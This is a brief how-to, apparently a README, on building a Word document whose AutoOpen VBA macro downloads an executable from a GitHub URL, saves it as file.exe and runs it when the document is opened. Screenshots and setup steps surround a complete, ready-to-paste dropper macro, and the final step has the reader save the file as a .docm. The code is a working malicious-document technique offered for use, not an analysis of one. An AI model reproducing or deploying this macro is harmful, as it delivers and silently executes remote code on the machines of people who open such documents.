# Creating Word Macros to AutoRun Downloader via Word Document

https://www.sciencedirect.com/science/article/pii/S1353485817300491
https://screwnomore.wordpress.com/2015/11/06/creating-malicious-word-macros-tutorial-autorun-stub-via-word-document/
https://www.vba-market.com/2018/01/02/vba-run-time-error-2146697208-800c0008-the-download-of-the-specified-resource-has-failed/

Alt+F11 in MS Word or

![](https://i.imgur.com/NmBdUZn.png)

![](https://i.imgur.com/nvvcP5z.png)

Then Double click on ThisDocument

![](https://i.imgur.com/28Hk2dn.png)

Paste this code into the field that appears

```
Sub AutoOpen()

Dim xHttp: Set xHttp = CreateObject("MSXML2.ServerXMLHTTP.3.0")
Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
xHttp.Open "GET", "https://github.com/NotSurprised/MacroDownloader/raw/master/HackMessage.exe", False
xHttp.Send

With bStrm
 .Type = 1 '//binary
 .Open
 .write xHttp.responseBody
 .savetofile "file.exe", 2 '//overwrite
End With

Shell ("file.exe")

End Sub
```

Now just save the file as filename.docm